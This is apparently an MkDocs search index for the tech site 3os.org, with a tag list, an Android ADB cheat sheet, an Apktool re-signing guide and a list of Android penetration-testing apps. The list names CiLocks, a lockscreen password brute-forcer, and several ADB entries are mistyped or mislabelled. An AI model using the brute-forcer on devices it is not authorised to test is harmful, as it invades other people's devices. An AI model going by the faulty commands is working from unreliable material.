{"config": {"indexing": "full", "lang": ["en"], "min_search_length": 3, "prebuild_index": true, "separator": "[\\s\\-]+"}, "docs": [{"location": "", "text": "", "title": "3os.org"}, {"location": "tags/", "text": "Tags and Categories \u00b6 Cookies \u00b6 Cookies Policy HomeLab \u00b6 Synology NAS MacOS \u00b6 Pyenv-virtualenv Multi Version Virtual Environment NAS \u00b6 Synology NAS Proxmox \u00b6 Windows VM Configuration Python \u00b6 Pyenv-virtualenv Multi Version Virtual Environment Synology \u00b6 Synology NAS Tweeks \u00b6 Windwos 10/11 Tweeks Ubuntu \u00b6 Free Port 53 on Ubuntu VirtIO \u00b6 Windows VM Configuration Windows Virtual Machines \u00b6 Windows VM Configuration Windwos \u00b6 Windwos 10/11 Tweeks adb \u00b6 ADB Cheat Sheet admonition \u00b6 Admonitions affiliate \u00b6 Affiliate Disclosure android \u00b6 ADB Cheat Sheet Apktool PT Application MobSF SSL Pinning Bypass apktool \u00b6 Apktool application \u00b6 PT Application autofs \u00b6 SMB Mount With autofs automation \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell Syncthing Motion Sensor Display Control bash \u00b6 DDNS Cloudflare Bash BrewUp cheat-sheet \u00b6 ADB Cheat Sheet Npm Command-line Utility PM2 - Node.js Process Manager Pip Package Manager Supervisor Process Manager Virtual Environment Ruby Gem Package Manager Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Git Cli Cheat Sheet Submodules Cheat Sheet chrome \u00b6 Chrome Extensions cloudflare \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell Let's Encrypt with Cloudflare code-blocks \u00b6 Code Blocks container \u00b6 Watchtower content-tabs \u00b6 Content Tabs ddns \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell debian \u00b6 Disable IPv6 diagram \u00b6 Diagrams dns \u00b6 Pi-hole with DOH on Docker Free Port 53 on Ubuntu dns-over-https \u00b6 Pi-hole with DOH on Docker docker \u00b6 Pi-hole with DOH on Docker Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Watchtower Docker on Raspberry Pi docker-compose \u00b6 Docker on Raspberry Pi doh \u00b6 Pi-hole with DOH on Docker dsm \u00b6 SSH With RSA Keys emojis \u00b6 Icons & Emojis endorsements \u00b6 Website Endorsements extensions \u00b6 Chrome Extensions Firefox Extensions external-markdown \u00b6 Embed External Markdown files-handling \u00b6 Files Handling firefox \u00b6 Firefox Extensions frida \u00b6 SSL Pinning Bypass gem \u00b6 Ruby Gem Package Manager git \u00b6 Git Cli Cheat Sheet github \u00b6 Removing Sensitive Data Git Cli Cheat Sheet Submodules Cheat Sheet BrewUp headings \u00b6 Basic Formatting history \u00b6 Removing Sensitive Data homebrew \u00b6 BrewUp Brew Snippets horizontal-line \u00b6 Basic Formatting iTerm2 \u00b6 TouchID for sudo icons \u00b6 Icons & Emojis igpu \u00b6 iGPU Passthrough to VM iGPU Split Passthrough images \u00b6 Images information \u00b6 Affiliate Disclosure Cookies Policy Website Endorsements MIT License Privacy Policy ipv6 \u00b6 Disable IPv6 on Proxmox Disable IPv6 letsencrypt \u00b6 Let's Encrypt with Cloudflare license \u00b6 MIT License links \u00b6 Links linux \u00b6 Syncthing Better Terminal Experience Files Handling Identify Network Interfaces lists \u00b6 Tables, Lists and Quotes macOS \u00b6 Applications Tweaks Enable Root User TouchID for sudo UI Tweaks BrewUp Brew Snippets macos \u00b6 Syncthing Better Terminal Experience magicmirror \u00b6 Magic Mirror 2.0 markdown \u00b6 Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin markdown-cheatsheet \u00b6 About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes mermaid \u00b6 Diagrams mkdocs \u00b6 About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes motion-sensor \u00b6 Motion Sensor Display Control mount \u00b6 SMB Mount With autofs network \u00b6 Proxmox Networking Identify Network Interfaces node \u00b6 Npm Command-line Utility PM2 - Node.js Process Manager npm \u00b6 Npm Command-line Utility PM2 - Node.js Process Manager oh-my-zsh \u00b6 Better Terminal Experience package-manager \u00b6 Pip Package Manager Ruby Gem Package Manager passthrough \u00b6 iGPU Passthrough to VM iGPU Split Passthrough penetration-testing \u00b6 Apktool PT Application MobSF pi-hole \u00b6 Pi-hole with DOH on Docker pip \u00b6 Pip Package Manager pm2 \u00b6 PM2 - Node.js Process Manager portfolio \u00b6 Stas Yakobov's Portfolio powershell \u00b6 DDNS Cloudflare PowerShell Windows SSH Server privacy policy \u00b6 Privacy Policy process-manager \u00b6 PM2 - Node.js Process Manager processes-manager \u00b6 Supervisor Process Manager proxmox \u00b6 Cloud Image Template Let's Encrypt with Cloudflare PVE Kernel Cleaner VM Disk Expander iGPU Passthrough to VM iGPU Split Passthrough Disable IPv6 on Proxmox Proxmox Networking python \u00b6 Pip Package Manager Supervisor Process Manager Virtual Environment quotes \u00b6 Tables, Lists and Quotes raspberry-pi \u00b6 Docker on Raspberry Pi External Power Button Motion Sensor Display Control Magic Mirror 2.0 resume \u00b6 Stas Yakobov's Portfolio reverse-engineering \u00b6 Apktool rsa-keys \u00b6 SSH With RSA Keys Windows SSH Server ruby \u00b6 Ruby Gem Package Manager security \u00b6 Removing Sensitive Data share \u00b6 SMB Mount With autofs smb \u00b6 SMB Mount With autofs ssh \u00b6 SSH With RSA Keys ssh-server \u00b6 Windows SSH Server ssl-pinning \u00b6 SSL Pinning Bypass submodules \u00b6 Submodules Cheat Sheet supervisor \u00b6 Supervisor Process Manager syncthing \u00b6 Syncthing synology \u00b6 Syncthing SSH With RSA Keys tables \u00b6 Tables, Lists and Quotes template \u00b6 Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin terminal \u00b6 Better Terminal Experience TouchID for sudo text-highlighting \u00b6 Basic Formatting touchID \u00b6 TouchID for sudo ubiquiti \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN ubuntu \u00b6 Disable IPv6 Remove Snap Store udm \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN unifi \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN venv \u00b6 Virtual Environment virtualization \u00b6 Cloud Image Template VM Disk Expander watchtower \u00b6 Watchtower windows \u00b6 Syncthing Windows SSH Server wireguard \u00b6 Wireguard VPN zsh \u00b6 Better Terminal Experience", "title": "Tags and Categories"}, {"location": "tags/#tags-and-categories", "text": "", "title": "Tags and Categories"}, {"location": "tags/#cookies", "text": "Cookies Policy", "title": "Cookies"}, {"location": "tags/#homelab", "text": "Synology NAS", "title": "HomeLab"}, {"location": "tags/#macos", "text": "Pyenv-virtualenv Multi Version Virtual Environment", "title": "MacOS"}, {"location": "tags/#nas", "text": "Synology NAS", "title": "NAS"}, {"location": "tags/#proxmox", "text": "Windows VM Configuration", "title": "Proxmox"}, {"location": "tags/#python", "text": "Pyenv-virtualenv Multi Version Virtual Environment", "title": "Python"}, {"location": "tags/#synology", "text": "Synology NAS", "title": "Synology"}, {"location": "tags/#tweeks", "text": "Windwos 10/11 Tweeks", "title": "Tweeks"}, {"location": "tags/#ubuntu", "text": "Free Port 53 on Ubuntu", "title": "Ubuntu"}, {"location": "tags/#virtio", "text": "Windows VM Configuration", "title": "VirtIO"}, {"location": "tags/#windows-virtual-machines", "text": "Windows VM Configuration", "title": "Windows Virtual Machines"}, {"location": "tags/#windwos", "text": "Windwos 10/11 Tweeks", "title": "Windwos"}, {"location": "tags/#adb", "text": "ADB Cheat Sheet", "title": "adb"}, {"location": "tags/#admonition", "text": "Admonitions", "title": "admonition"}, {"location": "tags/#affiliate", "text": "Affiliate Disclosure", "title": "affiliate"}, {"location": "tags/#android", "text": "ADB Cheat Sheet Apktool PT Application MobSF SSL Pinning Bypass", "title": "android"}, {"location": "tags/#apktool", "text": "Apktool", "title": "apktool"}, {"location": "tags/#application", "text": "PT Application", "title": "application"}, {"location": "tags/#autofs", "text": "SMB Mount With autofs", "title": "autofs"}, {"location": "tags/#automation", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell Syncthing Motion Sensor Display Control", "title": "automation"}, {"location": "tags/#bash", "text": "DDNS Cloudflare Bash BrewUp", "title": "bash"}, {"location": "tags/#cheat-sheet", "text": "ADB Cheat Sheet Npm Command-line Utility PM2 - Node.js Process Manager Pip Package Manager Supervisor Process Manager Virtual Environment Ruby Gem Package Manager Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Git Cli Cheat Sheet Submodules Cheat Sheet", "title": "cheat-sheet"}, {"location": "tags/#chrome", "text": "Chrome Extensions", "title": "chrome"}, {"location": "tags/#cloudflare", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell Let's Encrypt with Cloudflare", "title": "cloudflare"}, {"location": "tags/#code-blocks", "text": "Code Blocks", "title": "code-blocks"}, {"location": "tags/#container", "text": "Watchtower", "title": "container"}, {"location": "tags/#content-tabs", "text": "Content Tabs", "title": "content-tabs"}, {"location": "tags/#ddns", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell", "title": "ddns"}, {"location": "tags/#debian", "text": "Disable IPv6", "title": "debian"}, {"location": "tags/#diagram", "text": "Diagrams", "title": "diagram"}, {"location": "tags/#dns", "text": "Pi-hole with DOH on Docker Free Port 53 on Ubuntu", "title": "dns"}, {"location": "tags/#dns-over-https", "text": "Pi-hole with DOH on Docker", "title": "dns-over-https"}, {"location": "tags/#docker", "text": "Pi-hole with DOH on Docker Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Watchtower Docker on Raspberry Pi", "title": "docker"}, {"location": "tags/#docker-compose", "text": "Docker on Raspberry Pi", "title": "docker-compose"}, {"location": "tags/#doh", "text": "Pi-hole with DOH on Docker", "title": "doh"}, {"location": "tags/#dsm", "text": "SSH With RSA Keys", "title": "dsm"}, {"location": "tags/#emojis", "text": "Icons & Emojis", "title": "emojis"}, {"location": "tags/#endorsements", "text": "Website Endorsements", "title": "endorsements"}, {"location": "tags/#extensions", "text": "Chrome Extensions Firefox Extensions", "title": "extensions"}, {"location": "tags/#external-markdown", "text": "Embed External Markdown", "title": "external-markdown"}, {"location": "tags/#files-handling", "text": "Files Handling", "title": "files-handling"}, {"location": "tags/#firefox", "text": "Firefox Extensions", "title": "firefox"}, {"location": "tags/#frida", "text": "SSL Pinning Bypass", "title": "frida"}, {"location": "tags/#gem", "text": "Ruby Gem Package Manager", "title": "gem"}, {"location": "tags/#git", "text": "Git Cli Cheat Sheet", "title": "git"}, {"location": "tags/#github", "text": "Removing Sensitive Data Git Cli Cheat Sheet Submodules Cheat Sheet BrewUp", "title": "github"}, {"location": "tags/#headings", "text": "Basic Formatting", "title": "headings"}, {"location": "tags/#history", "text": "Removing Sensitive Data", "title": "history"}, {"location": "tags/#homebrew", "text": "BrewUp Brew Snippets", "title": "homebrew"}, {"location": "tags/#horizontal-line", "text": "Basic Formatting", "title": "horizontal-line"}, {"location": "tags/#iterm2", "text": "TouchID for sudo", "title": "iTerm2"}, {"location": "tags/#icons", "text": "Icons & Emojis", "title": "icons"}, {"location": "tags/#igpu", "text": "iGPU Passthrough to VM iGPU Split Passthrough", "title": "igpu"}, {"location": "tags/#images", "text": "Images", "title": "images"}, {"location": "tags/#information", "text": "Affiliate Disclosure Cookies Policy Website Endorsements MIT License Privacy Policy", "title": "information"}, {"location": "tags/#ipv6", "text": "Disable IPv6 on Proxmox Disable IPv6", "title": "ipv6"}, {"location": "tags/#letsencrypt", "text": "Let's Encrypt with Cloudflare", "title": "letsencrypt"}, {"location": "tags/#license", "text": "MIT License", "title": "license"}, {"location": "tags/#links", "text": "Links", "title": "links"}, {"location": "tags/#linux", "text": "Syncthing Better Terminal Experience Files Handling Identify Network Interfaces", "title": "linux"}, {"location": "tags/#lists", "text": "Tables, Lists and Quotes", "title": "lists"}, {"location": "tags/#macos_1", "text": "Applications Tweaks Enable Root User TouchID for sudo UI Tweaks BrewUp Brew Snippets", "title": "macOS"}, {"location": "tags/#macos_2", "text": "Syncthing Better Terminal Experience", "title": "macos"}, {"location": "tags/#magicmirror", "text": "Magic Mirror 2.0", "title": "magicmirror"}, {"location": "tags/#markdown", "text": "Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin", "title": "markdown"}, {"location": "tags/#markdown-cheatsheet", "text": "About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes", "title": "markdown-cheatsheet"}, {"location": "tags/#mermaid", "text": "Diagrams", "title": "mermaid"}, {"location": "tags/#mkdocs", "text": "About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes", "title": "mkdocs"}, {"location": "tags/#motion-sensor", "text": "Motion Sensor Display Control", "title": "motion-sensor"}, {"location": "tags/#mount", "text": "SMB Mount With autofs", "title": "mount"}, {"location": "tags/#network", "text": "Proxmox Networking Identify Network Interfaces", "title": "network"}, {"location": "tags/#node", "text": "Npm Command-line Utility PM2 - Node.js Process Manager", "title": "node"}, {"location": "tags/#npm", "text": "Npm Command-line Utility PM2 - Node.js Process Manager", "title": "npm"}, {"location": "tags/#oh-my-zsh", "text": "Better Terminal Experience", "title": "oh-my-zsh"}, {"location": "tags/#package-manager", "text": "Pip Package Manager Ruby Gem Package Manager", "title": "package-manager"}, {"location": "tags/#passthrough", "text": "iGPU Passthrough to VM iGPU Split Passthrough", "title": "passthrough"}, {"location": "tags/#penetration-testing", "text": "Apktool PT Application MobSF", "title": "penetration-testing"}, {"location": "tags/#pi-hole", "text": "Pi-hole with DOH on Docker", "title": "pi-hole"}, {"location": "tags/#pip", "text": "Pip Package Manager", "title": "pip"}, {"location": "tags/#pm2", "text": "PM2 - Node.js Process Manager", "title": "pm2"}, {"location": "tags/#portfolio", "text": "Stas Yakobov's Portfolio", "title": "portfolio"}, {"location": "tags/#powershell", "text": "DDNS Cloudflare PowerShell Windows SSH Server", "title": "powershell"}, {"location": "tags/#privacy-policy", "text": "Privacy Policy", "title": "privacy policy"}, {"location": "tags/#process-manager", "text": "PM2 - Node.js Process Manager", "title": "process-manager"}, {"location": "tags/#processes-manager", "text": "Supervisor Process Manager", "title": "processes-manager"}, {"location": "tags/#proxmox_1", "text": "Cloud Image Template Let's Encrypt with Cloudflare PVE Kernel Cleaner VM Disk Expander iGPU Passthrough to VM iGPU Split Passthrough Disable IPv6 on Proxmox Proxmox Networking", "title": "proxmox"}, {"location": "tags/#python_1", "text": "Pip Package Manager Supervisor Process Manager Virtual Environment", "title": "python"}, {"location": "tags/#quotes", "text": "Tables, Lists and Quotes", "title": "quotes"}, {"location": "tags/#raspberry-pi", "text": "Docker on Raspberry Pi External Power Button Motion Sensor Display Control Magic Mirror 2.0", "title": "raspberry-pi"}, {"location": "tags/#resume", "text": "Stas Yakobov's Portfolio", "title": "resume"}, {"location": "tags/#reverse-engineering", "text": "Apktool", "title": "reverse-engineering"}, {"location": "tags/#rsa-keys", "text": "SSH With RSA Keys Windows SSH Server", "title": "rsa-keys"}, {"location": "tags/#ruby", "text": "Ruby Gem Package Manager", "title": "ruby"}, {"location": "tags/#security", "text": "Removing Sensitive Data", "title": "security"}, {"location": "tags/#share", "text": "SMB Mount With autofs", "title": "share"}, {"location": "tags/#smb", "text": "SMB Mount With autofs", "title": "smb"}, {"location": "tags/#ssh", "text": "SSH With RSA Keys", "title": "ssh"}, {"location": "tags/#ssh-server", "text": "Windows SSH Server", "title": "ssh-server"}, {"location": "tags/#ssl-pinning", "text": "SSL Pinning Bypass", "title": "ssl-pinning"}, {"location": "tags/#submodules", "text": "Submodules Cheat Sheet", "title": "submodules"}, {"location": "tags/#supervisor", "text": "Supervisor Process Manager", "title": "supervisor"}, {"location": "tags/#syncthing", "text": "Syncthing", "title": "syncthing"}, {"location": "tags/#synology_1", "text": "Syncthing SSH With RSA Keys", "title": "synology"}, {"location": "tags/#tables", "text": "Tables, Lists and Quotes", "title": "tables"}, {"location": "tags/#template", "text": "Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin", "title": "template"}, {"location": "tags/#terminal", "text": "Better Terminal Experience TouchID for sudo", "title": "terminal"}, {"location": "tags/#text-highlighting", "text": "Basic Formatting", "title": "text-highlighting"}, {"location": "tags/#touchid", "text": "TouchID for sudo", "title": "touchID"}, {"location": "tags/#ubiquiti", "text": "CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN", "title": "ubiquiti"}, {"location": "tags/#ubuntu_1", "text": "Disable IPv6 Remove Snap Store", "title": "ubuntu"}, {"location": "tags/#udm", "text": "CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN", "title": "udm"}, {"location": "tags/#unifi", "text": "CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN", "title": "unifi"}, {"location": "tags/#venv", "text": "Virtual Environment", "title": "venv"}, {"location": "tags/#virtualization", "text": "Cloud Image Template VM Disk Expander", "title": "virtualization"}, {"location": "tags/#watchtower", "text": "Watchtower", "title": "watchtower"}, {"location": "tags/#windows", "text": "Syncthing Windows SSH Server", "title": "windows"}, {"location": "tags/#wireguard", "text": "Wireguard VPN", "title": "wireguard"}, {"location": "tags/#zsh", "text": "Better Terminal Experience", "title": "zsh"}, {"location": "android/adb-cheat-sheet/", "tags": ["android", "adb", "cheat-sheet"], "text": "Android ADB Cheat Sheet \u00b6 ADB, Android Debug Bridge, is a command-line utility included with Google's Android SDK. ADB can control your device over USB from a computer, copy files back and forth, install and uninstall apps, run shell commands, and more. ADB is a powerful tool that can be used to control your Android device from a computer. Below are some of the most common commands you can use with ADB and their usage. You can find more information about ADB and its usage by visiting the official website . Common ADB Commands \u00b6 Push a file to Download folder of the Android Device \u00b6 adb push example.apk /mnt/sdcard/Download/ Lists all the installed packages and get the full paths \u00b6 adb shell pm list packages -f Pulls a file from android device \u00b6 adb pull /mnt/sdcard/Download/example.apk Install apk from host to Android device \u00b6 adb shell install example.apk Install apk from Android device storage \u00b6 adb shell install /mnt/sdcard/Download/example.apk Set network proxy \u00b6 adb shell settings put global http_proxy <address>:<port> Disable network proxy adb shell settings put global http_proxy :0 ADB Basics Commands \u00b6 Command Description adb devices Lists connected devices adb connect 192.168.2.1 Connects to adb device over network adb root Restarts adbd with root permissions adb start-server Starts the adb server adb kill-server Kills the adb server adb reboot Reboots the device adb devices -l List of devices by product/model adb -s <deviceName> <command> Redirect command to specific device adb \u2013d <command> Directs command to only attached USB device adb \u2013e <command> Directs command to only attached emulator Logs \u00b6 Command Description adb logcat [options] [filter] [filter] View device log adb bugreport Print bug reports Permissions \u00b6 Command Description adb shell permissions groups List permission groups definitions adb shell list permissions -g -r List permissions details Package Installation \u00b6 Command Description adb shell install <apk> Install app adb shell install <path> Install app from phone path adb shell install -r <path> Install app from phone path adb shell uninstall <name> Remove the app Paths \u00b6 Command Description /data/data/ <package name> /databases App databases /data/data/ <package name> /shared_prefs/ Shared preferences /mnt/sdcard/Download/ Download folder /data/app Apk installed by user /system/app Pre-installed APK files /mmt/asec Encrypted apps (App2SD) /mmt/emmc Internal SD Card /mmt/adcard External/Internal SD Card /mmt/adcard/external_sd External SD Card ------- ----------- adb shell ls List directory contents adb shell ls -s Print size of each file adb shell ls -R List subdirectories recursively adb shell pm path <package name> Get full path of a package adb shell pm list packages -f Lists all the packages and full paths File Operations \u00b6 Command Description adb push <local> <remote> Copy file/dir to device adb pull <remote> <local> Copy file/dir from device run-as <package> cat <file> Access the private package files Phone Info \u00b6 Command Description adb get-stat\u0435 Print device state adb get-serialno Get the serial number adb shell dumpsys iphonesybinfo Get the IMEI adb shell netstat List TCP connectivity adb shell pwd Print current working directory adb shell dumpsys battery Battery status adb shell pm list features List phone features adb shell service list List all services adb shell dumpsys activity <package>/<activity> Activity info adb shell ps Print process status adb shell wm size Displays the current screen resolution Package Info \u00b6 Command Description adb shell list packages Lists package names adb shell list packages -r Lists package name + path to apks adb shell list packages -3 Lists third party package names adb shell list packages -s Lists only system packages adb shell list packages -u Lists package names + uninstalled adb shell dumpsys package packages Lists info on all apps adb shell dump <name> Lists info on one package adb shell path <package> Path to the apk file Device Related Commands \u00b6 Command Description adb reboot-recovery Reboot device into recovery mode adb reboot fastboot Reboot device into recovery mode adb shell screencap -p \"/path/to/screenshot.png\" Capture screenshot adb shell screenrecord \"/path/to/record.mp4\" Record device screen adb backup -apk -all -f backup.ab Backup settings and apps adb backup -apk -shared -all -f backup.ab Backup settings, apps and shared storage adb backup -apk -nosystem -all -f backup.ab Backup only non-system apps adb restore backup.ab Restore a previous backup ------- ----------- adb shell am start -a android.intent.action.VIEW -d URL Opens URL adb shell am start -t image/* -a android.intent.action.VIEW Opens gallery", "title": "ADB Cheat Sheet"}, {"location": "android/adb-cheat-sheet/#android-adb-cheat-sheet", "text": "ADB, Android Debug Bridge, is a command-line utility included with Google's Android SDK. ADB can control your device over USB from a computer, copy files back and forth, install and uninstall apps, run shell commands, and more. ADB is a powerful tool that can be used to control your Android device from a computer. Below are some of the most common commands you can use with ADB and their usage. You can find more information about ADB and its usage by visiting the official website .", "title": "Android ADB Cheat Sheet"}, {"location": "android/adb-cheat-sheet/#common-adb-commands", "text": "", "title": "Common ADB Commands"}, {"location": "android/adb-cheat-sheet/#push-a-file-to-download-folder-of-the-android-device", "text": "adb push example.apk /mnt/sdcard/Download/", "title": "Push a file to Download folder of the Android Device"}, {"location": "android/adb-cheat-sheet/#lists-all-the-installed-packages-and-get-the-full-paths", "text": "adb shell pm list packages -f", "title": "Lists all the installed packages and get the full paths"}, {"location": "android/adb-cheat-sheet/#pulls-a-file-from-android-device", "text": "adb pull /mnt/sdcard/Download/example.apk", "title": "Pulls a file from android device"}, {"location": "android/adb-cheat-sheet/#install-apk-from-host-to-android-device", "text": "adb shell install example.apk", "title": "Install apk from host to Android device"}, {"location": "android/adb-cheat-sheet/#install-apk-from-android-device-storage", "text": "adb shell install /mnt/sdcard/Download/example.apk", "title": "Install apk from Android device storage"}, {"location": "android/adb-cheat-sheet/#set-network-proxy", "text": "adb shell settings put global http_proxy <address>:<port> Disable network proxy adb shell settings put global http_proxy :0", "title": "Set network proxy"}, {"location": "android/adb-cheat-sheet/#adb-basics-commands", "text": "Command Description adb devices Lists connected devices adb connect 192.168.2.1 Connects to adb device over network adb root Restarts adbd with root permissions adb start-server Starts the adb server adb kill-server Kills the adb server adb reboot Reboots the device adb devices -l List of devices by product/model adb -s <deviceName> <command> Redirect command to specific device adb \u2013d <command> Directs command to only attached USB device adb \u2013e <command> Directs command to only attached emulator", "title": "ADB Basics Commands"}, {"location": "android/adb-cheat-sheet/#logs", "text": "Command Description adb logcat [options] [filter] [filter] View device log adb bugreport Print bug reports", "title": "Logs"}, {"location": "android/adb-cheat-sheet/#permissions", "text": "Command Description adb shell permissions groups List permission groups definitions adb shell list permissions -g -r List permissions details", "title": "Permissions"}, {"location": "android/adb-cheat-sheet/#package-installation", "text": "Command Description adb shell install <apk> Install app adb shell install <path> Install app from phone path adb shell install -r <path> Install app from phone path adb shell uninstall <name> Remove the app", "title": "Package Installation"}, {"location": "android/adb-cheat-sheet/#paths", "text": "Command Description /data/data/ <package name> /databases App databases /data/data/ <package name> /shared_prefs/ Shared preferences /mnt/sdcard/Download/ Download folder /data/app Apk installed by user /system/app Pre-installed APK files /mmt/asec Encrypted apps (App2SD) /mmt/emmc Internal SD Card /mmt/adcard External/Internal SD Card /mmt/adcard/external_sd External SD Card ------- ----------- adb shell ls List directory contents adb shell ls -s Print size of each file adb shell ls -R List subdirectories recursively adb shell pm path <package name> Get full path of a package adb shell pm list packages -f Lists all the packages and full paths", "title": "Paths"}, {"location": "android/adb-cheat-sheet/#file-operations", "text": "Command Description adb push <local> <remote> Copy file/dir to device adb pull <remote> <local> Copy file/dir from device run-as <package> cat <file> Access the private package files", "title": "File Operations"}, {"location": "android/adb-cheat-sheet/#phone-info", "text": "Command Description adb get-stat\u0435 Print device state adb get-serialno Get the serial number adb shell dumpsys iphonesybinfo Get the IMEI adb shell netstat List TCP connectivity adb shell pwd Print current working directory adb shell dumpsys battery Battery status adb shell pm list features List phone features adb shell service list List all services adb shell dumpsys activity <package>/<activity> Activity info adb shell ps Print process status adb shell wm size Displays the current screen resolution", "title": "Phone Info"}, {"location": "android/adb-cheat-sheet/#package-info", "text": "Command Description adb shell list packages Lists package names adb shell list packages -r Lists package name + path to apks adb shell list packages -3 Lists third party package names adb shell list packages -s Lists only system packages adb shell list packages -u Lists package names + uninstalled adb shell dumpsys package packages Lists info on all apps adb shell dump <name> Lists info on one package adb shell path <package> Path to the apk file", "title": "Package Info"}, {"location": "android/adb-cheat-sheet/#device-related-commands", "text": "Command Description adb reboot-recovery Reboot device into recovery mode adb reboot fastboot Reboot device into recovery mode adb shell screencap -p \"/path/to/screenshot.png\" Capture screenshot adb shell screenrecord \"/path/to/record.mp4\" Record device screen adb backup -apk -all -f backup.ab Backup settings and apps adb backup -apk -shared -all -f backup.ab Backup settings, apps and shared storage adb backup -apk -nosystem -all -f backup.ab Backup only non-system apps adb restore backup.ab Restore a previous backup ------- ----------- adb shell am start -a android.intent.action.VIEW -d URL Opens URL adb shell am start -t image/* -a android.intent.action.VIEW Opens gallery", "title": "Device Related Commands"}, {"location": "android/apktool/", "tags": ["android", "penetration-testing", "reverse-engineering", "apktool"], "text": "Android Apktool for Reverse Engineering \u00b6 A tool for reverse engineering 3 rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc. It is NOT intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms, analyzing applications and much more. Download and Documentation \u00b6 Official Apktool Website How to Sign APK After Compile \u00b6 In order to install modified APK on Android device, you need to sign it with a certificate. Android APK won't be signed by default. You need to sign it manually. Install apksigner apt install -y apksigner Create certificate at the same folder you've compiled your modified APK keytool -genkey -v -keystore keystore.jks -keyalg RSA -keysize 2048 -validity 10000 Enter A password (we will need it to singe the APK), enter any data you wish for the certificate information. At the end enter 'y' at the end to create the certificate. Now we should have 2 files: your.apk, keystore.jks. The only step left is to singe the APK with new certificate. apksigner sign --ks keystore.jks your.apk When installing the APK you will be prompted with a warning of \"unknown certificate\" just hit Install.", "title": "Apktool"}, {"location": "android/apktool/#android-apktool-for-reverse-engineering", "text": "A tool for reverse engineering 3 rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc. It is NOT intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms, analyzing applications and much more.", "title": "Android Apktool for Reverse Engineering"}, {"location": "android/apktool/#download-and-documentation", "text": "Official Apktool Website", "title": "Download and Documentation"}, {"location": "android/apktool/#how-to-sign-apk-after-compile", "text": "In order to install modified APK on Android device, you need to sign it with a certificate. Android APK won't be signed by default. You need to sign it manually. Install apksigner apt install -y apksigner Create certificate at the same folder you've compiled your modified APK keytool -genkey -v -keystore keystore.jks -keyalg RSA -keysize 2048 -validity 10000 Enter A password (we will need it to singe the APK), enter any data you wish for the certificate information. At the end enter 'y' at the end to create the certificate. Now we should have 2 files: your.apk, keystore.jks. The only step left is to singe the APK with new certificate. apksigner sign --ks keystore.jks your.apk When installing the APK you will be prompted with a warning of \"unknown certificate\" just hit Install.", "title": "How to Sign APK After Compile"}, {"location": "android/applications/", "tags": ["android", "application", "penetration-testing"], "text": "Penetration Testing Application for Android \u00b6 List for Android penetration testing applications and tools that can be used to aid in penetration testing. The following are the most commonly used applications. Feel free to suggest new applications and tools at comments section below. List of Android Penetration Testing Tools and Applications \u00b6 Magisk Manager - Systemless rooting system. EdXposed Manager - Companion Android application for EdXposed. BusyBox - Android busyBox. SQLite Editor Master - SQLite Editor. Root Explorer File Manager for Root Users (Root Required). CiLocks - Python script to brute force android lockscreen password. Network Analyzer - Network Analyzer for Android. Packet Capture - Packet capture/Network traffic sniffer. Material Terminal - Terminal for Android. Gplaycli Cli Tool to download APK form PlayStore.", "title": "PT Application"}, {"location": "android/applications/#penetration-testing-application-for-android", "text": "List for Android penetration testing applications and tools that can be used to aid in penetration testing. The following are the most commonly used applications. Feel free to suggest new applications and tools at comments section below.", "title": "Penetration Testing Application for Android"}, {"location": "android/applications/#list-of-android-penetration-testing-tools-and-applications", "text": "Magisk Manager - Systemless rooting system. EdXposed Manager - Companion Android application for EdXposed. BusyBox - Android busyBox. SQLite Editor Master - SQLite Editor. Root Explorer File Manager for Root Users (Root Required). CiLocks - Python script to brute force android lockscreen password. Network Analyzer - Network Analyzer for Android. Packet Capture - Packet capture/Network traffic sniffer. Material Terminal - Terminal for Android. Gplaycli Cli Tool to download APK form PlayStore.", "title": "List of Android Penetration Testing Tools and Applications"}, {"location": "android/mobsf/", "tags": ["android", "penetration-testing"], "text": 